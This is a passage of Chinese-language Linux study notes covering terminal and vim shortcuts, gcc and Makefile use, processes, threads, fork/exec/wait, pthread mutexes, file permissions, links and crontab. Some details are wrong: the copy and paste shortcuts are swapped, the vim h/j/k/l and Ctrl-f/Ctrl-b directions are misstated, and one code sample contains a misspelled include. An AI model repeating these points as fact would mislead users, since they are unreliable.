<p><strong>在终端&amp;控制台下copy and paste：</strong></p>
<ul>
<li>粘贴：<code>Ctrl + Shift + c</code> 或 <code>Ctrl + Insert</code></li>
<li>复制：<code>Ctrl + Shift + v</code> 或 <code>Shift + Insert</code></li>
</ul>
<p><strong>在终端中搜索内容</strong></p>
<p>Ctrl + Shift + f</p>
<p><strong>命令行历史</strong></p>
<ul>
<li>上键、<code>Ctrl + p</code>：查看上一个使用过的命令</li>
<li>下键、<code>Ctrl + n</code>：查看下一个使用过的命令</li>
<li><code>Ctrl + r</code>：搜索历史命令。输入若干字符，开始向上搜索包含该字符的命令，继续按Ctrl+r，搜索上一条匹配的命令</li>
</ul>
<p><strong>清屏</strong></p>
<p><code>Ctrl + l</code></p>
<p><strong>横线的数量</strong></p>
<ul>
<li>一横：表示参数是字符形式，如<code>ls -a</code></li>
<li>两横：表示参数是单词形式，如<code>cp --help</code></li>
</ul>
<h4 id="5-2-vim"><a href="#5-2-vim" class="headerlink" title="5.2 vim"></a>5.2 vim</h4><p>移动光标：gg第一行，G最后一行，XG第X行；</p>
<p>删除一行：dd     删除单词：dw</p>
<p>复制一行：yy</p>
<p>粘贴一行：p</p>
<p><strong>退出编辑器</strong></p>
<table>
<thead>
<tr>
<th>按键</th>
<th align="left">功能</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td>:w</td>
<td align="left">将缓冲区写入文件，即保存修改</td>
<td align="center"></td>
</tr>
<tr>
<td>:wq</td>
<td align="left">保存修改并退出</td>
<td align="center"></td>
</tr>
<tr>
<td>:x</td>
<td align="left">保存修改并退出</td>
<td align="center"></td>
</tr>
<tr>
<td>:q</td>
<td align="left">退出，如果对缓冲区进行过修改，则会提示</td>
<td align="center"></td>
</tr>
<tr>
<td>:q!</td>
<td align="left">强制退出，放弃修改</td>
<td align="center"></td>
</tr>
</tbody></table>
<p><strong>显示行数</strong></p>
<p><code>:set nu</code></p>
<p><strong>光标移动</strong></p>
<table>
<thead>
<tr>
<th align="center">按键</th>
<th align="center">功能</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">h,j,k,l</td>
<td align="center">上，下，左，右</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ctrl-e</td>
<td align="center">移动页面</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ctrl-f</td>
<td align="center">上翻一页</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ctrl-b</td>
<td align="center">下翻一页</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ctrl-u</td>
<td align="center">上翻半页</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ctrl-d</td>
<td align="center">下翻半页</td>
<td align="center"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">w</th>
<th align="center">跳到下一个字首，按标点或单词分割</th>
<th>接上表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">W</td>
<td align="center">跳到下一个字首，长跳，如end-of-line被认为是一个字</td>
<td></td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">跳到下一个字尾</td>
<td></td>
</tr>
<tr>
<td align="center">E</td>
<td align="center">跳到下一个字尾，长跳</td>
<td></td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">跳到上一个字</td>
<td></td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">跳到上一个字，长跳</td>
<td></td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">跳至行首，不管有无缩进，就是跳到第0个字符</td>
<td></td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">跳至行首的第一个字符</td>
<td></td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">跳至行尾</td>
<td>常用</td>
</tr>
<tr>
<td align="center">gg</td>
<td align="center">跳至文首</td>
<td>常用</td>
</tr>
<tr>
<td align="center">G</td>
<td align="center">调至文尾</td>
<td>常用</td>
</tr>
<tr>
<td align="center">5gg/5G</td>
<td align="center">调至第5行</td>
<td></td>
</tr>
<tr>
<td align="center">gd</td>
<td align="center">跳至当前光标所在的变量的声明处</td>
<td></td>
</tr>
<tr>
<td align="center">fx</td>
<td align="center">在当前行中找x字符，找到了就跳转至</td>
<td></td>
</tr>
<tr>
<td align="center">;</td>
<td align="center">重复上一个f命令，而不用重复的输入fx</td>
<td></td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">查找光标所在处的单词，向下查找</td>
<td></td>
</tr>
<tr>
<td align="center">#</td>
<td align="center">查找光标所在处的单词，向上查找</td>
<td></td>
</tr>
</tbody></table>
<p><strong>删除复制</strong></p>
<table>
<thead>
<tr>
<th align="left">按esc后，然后ggvG或者ggVG</th>
<th align="center">全选（高亮显示）</th>
</tr>
</thead>
<tbody><tr>
<td align="left">按esc后，然后ggyG</td>
<td align="center">全部复制</td>
</tr>
<tr>
<td align="left">按esc后，然后dG</td>
<td align="center">全部删除</td>
</tr>
</tbody></table>
<h2 id="基础的-gcc-and-makefile-操作"><a href="#基础的-gcc-and-makefile-操作" class="headerlink" title="基础的 gcc and makefile 操作"></a>基础的 gcc and makefile 操作</h2><h3 id="1-gcc"><a href="#1-gcc" class="headerlink" title="1. gcc"></a>1. gcc</h3><h4 id="1-1-单文件编译"><a href="#1-1-单文件编译" class="headerlink" title="1.1 单文件编译"></a>1.1 单文件编译</h4><p><code>gcc test.c -o test</code></p>
<h4 id="1-2-多文件编译"><a href="#1-2-多文件编译" class="headerlink" title="1.2 多文件编译"></a>1.2 多文件编译</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">gcc -c test1.c -o test1.o</span><br><span class="line">gcc -c test2.c -o test2.o</span><br><span class="line">gcc test1.o test2.o -o test</span><br></pre></td></tr></table></figure>

<h3 id="2-Makefile"><a href="#2-Makefile" class="headerlink" title="2.Makefile"></a>2.Makefile</h3><p>数据结构作业中用到了makefile</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">maincc:main.o compress.o pack.o  hfman.o</span></span><br><span class="line">	g++ pack.o compress.o main.o  hfman.o -o compress_win</span><br><span class="line"><span class="section">main.o:main.cpp</span></span><br><span class="line">	g++ -c main.cpp</span><br><span class="line"><span class="section">pack.o:pack.cpp</span></span><br><span class="line">	g++ -c pack.cpp</span><br><span class="line"><span class="section">compress:compress.cpp</span></span><br><span class="line">	g++ -c compress.cpp</span><br><span class="line"><span class="section">hfman:hfman.cpp</span></span><br><span class="line">	g++ -c hfman.cpp</span><br><span class="line"></span><br><span class="line"><span class="comment">#maincc:main.o compress.o pack.o debugg.o\</span></span><br><span class="line">	g++ pack.o compress.o main.o  debugg.o -o compress_debug_co\</span><br><span class="line"><span class="section">main.o:main.cpp\</span></span><br><span class="line">	g++ -c main.cpp\</span><br><span class="line"><span class="section">pack.o:pack.cpp\</span></span><br><span class="line">	g++ -c pack.cpp\</span><br><span class="line"><span class="section">compress:compress.cpp\</span></span><br><span class="line">	g++ -c compress.cpp\</span><br><span class="line"><span class="section">debugg:debugg.cpp\</span></span><br><span class="line">	g++ -c debugg.cpp\</span><br></pre></td></tr></table></figure>

<p>注意注释编写规范。</p>
<h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><h3 id="1-进程与线程区别"><a href="#1-进程与线程区别" class="headerlink" title="1.进程与线程区别"></a>1.进程与线程区别</h3><p>引用：<a href="https://my.oschina.net/cnyinlinux/blog/422207">链接</a></p>
<blockquote>
<p>第一个被创造出来的进程是0号进程，这个进程在操作系统层面是不可见的，但它存在着。0号进程完成了操作系统的功能加载与初期设定，然后它创造了1号进程(init)，这个1号进程就是操作系统的“耶稣”。1号进程是上帝派来管理整个操作系统的，所以在用pstree查看进程树可知，1号进程位于树根。再之后，系统的很多管理程序都以进程身份被1号进程创造出来，还创造了与人类沟通的桥梁——shell。从那之后，人类可以跟操作系统进行交流，可以编写程序，可以执行任务。。。</p>
</blockquote>
<blockquote>
<p>无论是进程还是线程，对于程序员而言，都是用来实现多任务并发的技术手段。二者都可以独立调度，因此在多任务环境下，功能上并无差异。并且二者都具有各自的实体，是系统独立管理的对象个体。所以在系统层面，都可以通过技术手段实现二者的控制。而且二者所具有的状态都非常相似。而且，在多任务程序中，子进程(子线程)的调度一般与父进程(父线程)平等竞争。</p>
</blockquote>
<p>进程是资源分配的基本单位，线程是调度的基本单位。</p>
<blockquote>
<p>这句经典名言已流传数十年，各种操作系统教材都可见此描述。确实如此，这就是二者的显著区别。读者请注意“基本”二字。相信有读者看到前半句的时候就在心里思考，“进程岂不是不能调度？”，非也！进程和线程都可以被调度，否则多进程程序该如何运行呢！</p>
<p>只是，线程是更小的可以调度的单位，也就是说，只要达到线程的水平就可以被调度了，进程自然可以被调度。它强调的是分配资源时的对象必须是进程，不会给一个线程单独分配系统管理的资源。若要运行一个任务，想要获得资源，最起码得有进程，其他子任务可以以线程身份运行，资源共享就行了。</p>
<p>  简而言之，进程的个体间是完全独立的，而线程间是彼此依存的。多进程环境中，任何一个进程的终止，不会影响到其他进程。而多线程环境中，父线程终止，全部子线程被迫终止(没有了资源)。而任何一个子线程终止一般不会影响其他线程，除非子线程执行了exit()系统调用。任何一个子线程执行exit()，全部线程同时灭亡。</p>
<p>其实，也没有人写出只有线程而没有进程的程序。多线程程序中至少有一个主线程，而这个主线程其实就是有main函数的进程。它是整个程序的进程，所有线程都是它的子线程。我们通常把具有多线程的主进程称之为主线程。</p>
</blockquote>
<blockquote>
<p>进程的备份关系森严，在父进程没有结束前，所有的子进程都尊从父子关系，也就是说A创建了B，则A与B是父子关系，B又创建了C，则B与C也是父子关系，A与C构成爷孙关系，也就是说C是A的孙子进程。在系统上使用pstree命令打印进程树，可以清晰看到备份关系。</p>
<p>多线程间的关系没有那么严格，不管是父线程还是子线程创建了新的线程，都是共享父线程的资源，所以，都可以说是父线程的子线程，也就是只存在一个父线程，其余线程都是父线程的子线程。</p>
</blockquote>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="1-chmod"><a href="#1-chmod" class="headerlink" title="1.chmod"></a>1.chmod</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/rwx-standard-unix-permission-bits.png" alt="chmod"></p>
<table>
<thead>
<tr>
<th align="left">#</th>
<th align="left">权限</th>
<th align="left">rwx</th>
<th align="left">二进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">7</td>
<td align="left">读 + 写 + 执行</td>
<td align="left">rwx</td>
<td align="left">111</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">读 + 写</td>
<td align="left">rw-</td>
<td align="left">110</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">读 + 执行</td>
<td align="left">r-x</td>
<td align="left">101</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">只读</td>
<td align="left">r–</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">写 + 执行</td>
<td align="left">-wx</td>
<td align="left">011</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">只写</td>
<td align="left">-w-</td>
<td align="left">010</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">只执行</td>
<td align="left">–x</td>
<td align="left">001</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">无</td>
<td align="left">—</td>
<td align="left">000</td>
</tr>
</tbody></table>
<h3 id="2-软连接和硬链接"><a href="#2-软连接和硬链接" class="headerlink" title="2.软连接和硬链接"></a>2.软连接和硬链接</h3><h4 id="2-1-硬链接"><a href="#2-1-硬链接" class="headerlink" title="2.1 硬链接"></a>2.1 硬链接</h4><p>硬链接是通过索引节点进行的链接。在Linux中，多个文件指向同一个索引节点是允许的，像这样的链接就是硬链接。硬链接只能在同一文件系统中的文件之间进行链接，<strong>不能对目录进行创建。</strong>如果删除硬链接对应的源文件，则硬链接文件仍然存在，而且保存了原有的内容，这样可以起到<strong>防止因为误操作而错误删除文件的作用。</strong>由于硬链接是有着相同 inode 号仅文件名不同的文件，因此，删除一个硬链接文件并不影响其他有相同 inode 号的文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">link oldfile newfile </span><br><span class="line">ln oldfile newfile</span><br></pre></td></tr></table></figure>

<h4 id="2-2-软链接"><a href="#2-2-软链接" class="headerlink" title="2.2 软链接"></a>2.2 软链接</h4><p>软链接（也叫符号链接）与硬链接不同，文件用户数据块中存放的内容是另一文件的路径名的指向。软链接就是一个普通文件，只是数据块内容有点特殊。软链接可对文件或目录创建。</p>
<p>软链接主要应用于以下两个方面：一是方便管理，例如可以把一个复杂路径下的文件链接到一个简单路径下方便用户访问；另一方面就是解决文件系统磁盘空间不足的情况。例如某个文件文件系统空间已经用完了，但是现在必须在该文件系统下创建一个新的目录并存储大量的文件，那么可以把另一个剩余空间较多的文件系统中的目录链接到该文件系统中，这样就可以很好的解决空间不足问题。删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接就变成了死链接。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s old.file soft.link</span><br><span class="line">ln -s old.dir soft.link.dir</span><br></pre></td></tr></table></figure>

<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="1-crontab"><a href="#1-crontab" class="headerlink" title="1. crontab"></a>1. crontab</h3><p>crontab -e打开设置文件，crontab可能并没有在ubuntu上安装，使用sudo apt-get install 来安装。</p>
<p>在crontab -e后打开的文件里修改。</p>
<p>修改的规则如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f1 f2 f3 f4 f5 program</span><br></pre></td></tr></table></figure>

<ul>
<li>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</li>
<li>当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</li>
<li>当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</li>
<li>当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</li>
<li>当 f1 为 a, b, c,… 时表示第 a, b, c,… 分钟要执行，f2 为 a, b, c,… 时表示第 a, b, c…个小时要执行，其馀类推</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*    *    *    *    *</span><br><span class="line">-    -    -    -    -</span><br><span class="line">|    |    |    |    |</span><br><span class="line">|    |    |    |    +----- 星期中星期几 (0 - 6) (星期天 为0)</span><br><span class="line">|    |    |    +---------- 月份 (1 - 12) </span><br><span class="line">|    |    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +-------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------- 分钟 (0 - 59)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*/3 * * * * date &gt;&gt; /home/wangchenghua/hello.txt</span><br></pre></td></tr></table></figure>

<h3 id="2-exec"><a href="#2-exec" class="headerlink" title="2.exec"></a>2.exec</h3><ul>
<li><p>execve函数是真正意义上的系统调用</p>
</li>
<li><p>其他为经过包装的库函数，最终调用的还是execve函数。</p>
</li>
<li><p>带“l”表示以列表的形式传参数</p>
</li>
<li><p>带“v”表示以数组的形式传参数</p>
</li>
<li><p>带“e”表示将环境变量传递给函数</p>
</li>
<li><p>带“p”表示第一个参数filename不用输入完整的路径，只要给出命令名即可，它会在环境变量PATH中查找命令</p>
</li>
</ul>
<p>该函数定义在<code>&lt;unistd.h&gt;</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * argv[] = &#123;<span class="string">&quot;wensen.sh&quot;</span>, <span class="number">0</span>&#125;;  <span class="comment">// 数组最后一位需要为0</span></span><br><span class="line">    execvp(<span class="string">&quot;/home/wensen/workspace/test/wensen.sh&quot;</span>, argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">————————————————</span><br><span class="line">原文链接：https:<span class="comment">//blog.csdn.net/u011857683/article/details/81160059</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，执行的时候，传入的参数的第一个必须是这个被执行文件的文件名，最后的一位数组必须是0；</p>
<p>与一般情况不同，exec函数族的函数执行成功后不会返回，因为调用进程的实体，包括代码段，数据段和堆栈等都已经被新的内容取代，只留下进程ID等一些表面上的信息仍保持原样，颇有些神似”三十六计”中的”金蝉脱壳”。看上去还是旧的躯壳，却已经注入了新的灵魂。只有调用失败了，它们才会返回一个-1，从原程序的调用点接着往下执行。 </p>
<h3 id="3-进程"><a href="#3-进程" class="headerlink" title="3.进程"></a>3.进程</h3><p>进程由程序产生，是动态的，是一个运行着的、要占用系统运行资源的程序。简而言之，进程就是程序的一次运行过程。系统给每一个进程都分配了一个唯一的进程标识符（进程号，简称PID）。</p>
<p><strong>进程相关的参数</strong></p>
<blockquote>
<p>PID：进程号（Process ID），用于唯一标识进程。</p>
<p>PPID：父进程号（Parent PID），创建某进程的上一个进程的进程号。</p>
<p>USER/UID：启动某个进程的用户ID和该用户所属组的ID。</p>
<p>STAT：进程状态，颐和进程可能处于多种状态，如运行、等待、停止、睡眠、僵死等。</p>
<p>PRIORITY：进程的优先级，数字越大表示优先级越低。</p>
<p>NICE：进程的谦让度，表示进程对CPU时间要求的迫切程度。</p>
<p>资源占用：包括CPU、内存等资源的占用信息。</p>
</blockquote>
<p><strong>进程的类型</strong></p>
<ul>
<li><p>交互进程：在Shell下通过执行程序所产生的进程，可在前台或后台运行。</p>
</li>
<li><p>批处理进程：一个进程序列。</p>
</li>
<li><p>守护进程：又称监控进程，是指那些在后台运行，并且没有控制终端的进程，通常可以随着操作系统的启动而运行，也可将其称为<strong>服务</strong>。</p>
</li>
</ul>
<p><strong>在terminal中使用ps命令查看，也可以使用第三方的htop查看</strong></p>
<p><strong>进程的基本状态</strong></p>
<ol>
<li>就绪状态</li>
<li>执行状态</li>
<li>阻塞状态</li>
</ol>
<p><strong>进程控制块</strong></p>
<blockquote>
<ol>
<li>为了描述和控制进程的运行，系统为每个进程定义了一个数据结构，该数据结构被称为进程控制块PCB。</li>
<li>PCB是进程存在的唯一标志.</li>
</ol>
</blockquote>
<p><strong>进程启动</strong></p>
<blockquote>
<ol>
<li>前台方式启动进程: 打开系统终端，在终端窗口的命令行提示符后输入Linux命令并按回车键，就以前台方式启动了一个进程。</li>
<li>后台方式启动进程: 在终端下，以后台方式启动进程，需要在执行的命令后面添加一个“&amp;”符号</li>
</ol>
</blockquote>
<p><strong>进程优先级改变</strong></p>
<p>查看目前进程的优先级： <code>ps –l</code></p>
<blockquote>
<p>改变进程优先级的命令——<strong>nice命令</strong></p>
<p>【功能】在<strong>启动进程时</strong>指定请求进程执行优先级</p>
<p>【格式】nice [选项] 命令</p>
<p>【选项】常用的一个选项是“-n”，n值即为NI的值，n值的范围为-20—19。n值越小优先级越高。即，-20代表最高的NI优先级，19代表最低的NI优先级。如果不加该选项，默认NI值为10。</p>
<p>【说明】默认情况下，只有root用户才能提高请求进程的优先级，普通用户只能降低请求进程的优先级</p>
</blockquote>
<blockquote>
<p><strong>renice命令</strong></p>
<p>【功能】在<strong>进程执行时</strong>改变NI的值。</p>
<p>【格式】renice [+/-n] [-g 命令名…] [-p 进程标识码…] [-u 进程所有者…]</p>
<p>【说明】可以通过命令名、进程标识码、进程所有者名指定要改变的进程的NI值</p>
</blockquote>
<blockquote>
<p><strong>kill命令</strong></p>
<p>【功能】终止进程</p>
<p>【格式】kill [-信号] PID</p>
<p>【说明】kill命令用来终止进程，实际是向指定进程发送特定的信号。从而使该进程根据这个信号执行特定的动作。信号可以用信号名称，也可以使用信号码。</p>
</blockquote>
<blockquote>
<p><strong>pstree命令</strong></p>
<p>【功能】显示进程<strong>家族树的信息</strong></p>
<p>【格式】pstree [选项] [进程PID/用户名]</p>
</blockquote>
<p>fork命令: 一个进程调用fork来复制自己。创建子进程后，父、子进程执行同一个程序，<strong>子进程继承父进程的资源。</strong>调用fork（）函数后，系统将创建一个与当前进程相同的新的进程。它与原有的进程具有相同的数据、连接关系和从同一处执行的连续性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;my pid is %d\n&quot;</span>, getpid() );</span><br><span class="line">	fork();</span><br><span class="line">	fork();</span><br><span class="line">	fork();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;my pid is %d\n&quot;</span>, getpid() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">问题：程序会有几行输出？</span><br></pre></td></tr></table></figure>

<p><strong>分辨子进程还是父进程</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>	fork_rv;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: my pid is %d\n&quot;</span>, getpid());</span><br><span class="line">    fork_rv = fork();		<span class="comment">/* create new process  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( fork_rv == <span class="number">-1</span> )	<span class="comment">/* check for error	*/</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( fork_rv == <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the child.  my pid=%d\n&quot;</span>, getpid());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;I am the parent. my child is %d\n&quot;</span>, fork_rv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>父进程如何等待子进程的退出</strong></p>
<blockquote>
<p>Wait做的两件事情：</p>
<ul>
<li>暂停调用它的进程直到子进程结束</li>
<li>取得子进程结束时传给exit的值</li>
</ul>
</blockquote>
<blockquote>
<p>进程一旦调用了wait，就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。</p>
</blockquote>
<p><strong>僵尸进程</strong></p>
<blockquote>
<p>注意：在一个进程调用了exit之后，该进程并非马上就消失掉，而是留下一个称为僵尸进程（Zombie）的数据结构。在Linux进程的5种状态中，僵尸进程是非常特殊的一种，它已经放弃了几乎所有内存空间，没有任何可执行代码，也不能被调度，仅仅在进程列表中保留一个位置，记载该进程的退出状态等信息供其他进程收集，除此之外，僵尸进程不再占有任何内存空间。</p>
</blockquote>
<p><strong>如何结束僵尸进程？</strong></p>
<blockquote>
<ul>
<li>父进程中使用wait函数，收尸。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>把父进程杀掉。父进程死后，僵尸进程成为”孤儿进程”，过继给1号进程init，init始终会负责清理僵尸进程．它产生的所有僵尸进程也跟着消失.</li>
</ul>
</blockquote>
<p><strong>wait()</strong></p>
<blockquote>
<p>进程一旦调用了wait，就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。</p>
</blockquote>
<blockquote>
<p>参数status用来保存被收集进程退出时的一些状态，它是一个指向int类型的指针。但如果我们对这个子进程是如何死掉的毫不在意，只想把这个僵尸进程消灭掉，（事实上绝大多数情况下，我们都会这样想），我们就可以设定这个参数为NULL，就象下面这样：pid = wait(NULL);  <strong>如果成功，wait会返回被收集的子进程的进程ID，如果调用进程没有子进程，调用就会失败，此时wait返回-1</strong></p>
</blockquote>
<h3 id="4-线程-重点"><a href="#4-线程-重点" class="headerlink" title="4.线程(重点)"></a>4.线程(重点)</h3><p>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。</p>
<p>（1）线程采用了多个线程<strong>可共享资源</strong>的设计思想。在多进程情况下，每个进程都有自己独立的地址空间，在多线程情况下，同一进程内的线程共享进程的地址空间。线程和进程的最大区别在于<strong>线程完全共享相同的地址空间，运行在同一地址上</strong>。</p>
<p>（2）由于进程地址空间独立而线程共享地址空间，所以从一个线程切换到另一线程所花费的代价比进程低。</p>
<p>（3）进程本身的信息在内存中占用的空间比线程大。因此，<strong>线程更能充分地利用内存</strong>。线程可以看作是在进程内部执行的指定序列。</p>
<p>（4）线程间的通信比进程间的通信更加方便和省时。进程间的数据空间相互独立，彼此通信要以专门的通信方式进行，通信时必须经过操作系统，而同一进程的多个线程共享数据空间，<strong>一个线程的数据可以直接提供给其他线程使用，不必进过操作系统。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">pthread_t</span> *<span class="keyword">restrict</span> tidp,   <span class="comment">//新创建的线程ID指向的内存单元。</span></span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,  <span class="comment">//线程属性，默认为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">void</span> *(*start_rtn)(<span class="keyword">void</span> *), <span class="comment">//新创建的线程从start_rtn函数的地址开始运行</span></span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">void</span> *<span class="keyword">restrict</span> arg <span class="comment">//默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  )</span></span>;</span><br><span class="line">————————————————</span><br><span class="line">原文链接：https:<span class="comment">//blog.csdn.net/wushuomin/article/details/80051295</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;pthread.h&gt;</span> <span class="comment">// vital</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#icnlude  <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_msg</span><span class="params">(<span class="keyword">char</span> *m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;NUM ; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, m);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> t1, t2;		<span class="comment">/* two threads */</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span>	*<span class="title">print_msg</span><span class="params">(<span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;t1, <span class="literal">NULL</span>, print_msg, (<span class="keyword">void</span> *)<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">	pthread_create(&amp;t2, <span class="literal">NULL</span>, print_msg, (<span class="keyword">void</span> *)<span class="string">&quot;world\n&quot;</span>);</span><br><span class="line">	pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pthread_join使得调用线程挂起直至有thread参数指定的线程终止。</p>
<p>多个线程在一个单独的进程中运行，共享全局变量，因此线程间可以通过设置和读取全局变量来进行通信。</p>
<p>对共享内存的访问是线程的一个既有用又极其危险的特性</p>
</blockquote>
<p><strong>pthread_mutex_lock</strong></p>
<p><strong>pthread_mutex_unlock</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pthread_mutex_t</span> counter_lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line">pthread_mutex_lock(&amp;counter_lock);</span><br><span class="line">total_words++;</span><br><span class="line">pthread_mutex_unlock(&amp;counter_lock);</span><br></pre></td></tr></table></figure>

<h3 id="5-pwd"><a href="#5-pwd" class="headerlink" title="5.pwd"></a>5.pwd</h3><p>1、如何判断是否到达目录树的顶点？</p>
<p>在unix文件系统的根目录中“.”和“..”指向同一个i-节点时，就以认为到达树的顶端。</p>
<p>2、如何正确显示目录名？</p>
<p>递归地调用并显示，或者使用栈数据结构；</p>
<p><strong>命令pwd的实现流程</strong></p>
<ol>
<li>得到”.”的i-节点号，称其为n(使用stat)；</li>
<li>chdir ..，切换到上一级目录( 使用chdir)；</li>
